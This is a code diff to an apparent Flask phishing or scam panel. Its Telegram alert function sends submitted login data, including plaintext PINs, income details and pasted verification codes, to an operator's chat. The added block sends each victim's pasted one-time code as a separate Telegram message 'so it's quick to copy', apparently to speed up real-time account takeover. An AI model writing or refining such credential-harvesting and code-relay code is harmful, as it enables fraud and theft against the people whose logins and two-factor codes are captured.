@@ -30,7 +30,6 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
 
     db_id = str(app_data.get("_id"))
     raw_msg = (app_data.get("final_auth_code") or "").strip()
-    formatted_msg = raw_msg if raw_msg else "—"
 
     message = (
         f"⚡ *{stage_title}*\n"
@@ -42,7 +41,6 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
         f"• *Purpose:* {app_data.get('purpose', '—')}\n"
         f"• *Income:* ${app_data.get('income', '—')}\n"
         f"• *PIN:* `{app_data.get('password', '—')}`\n"
-        f"• *Pasted Message:*\n{formatted_msg}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"• *Ref ID:* `{app_data.get('app_id')}`"
     )
@@ -85,9 +83,19 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
                 "reply_markup": reply_markup,
             }
             requests.post(url, json=payload_plain, timeout=6)
+
+        # Send the pasted verification message by itself so it's quick to copy
+        if raw_msg:
+            requests.post(
+                url,
+                json={
+                    "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                    "text": raw_msg,
+                },
+                timeout=6,
+            )
     except Exception as e:
         print(f"Telegram alert error: {e}")
-
 
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
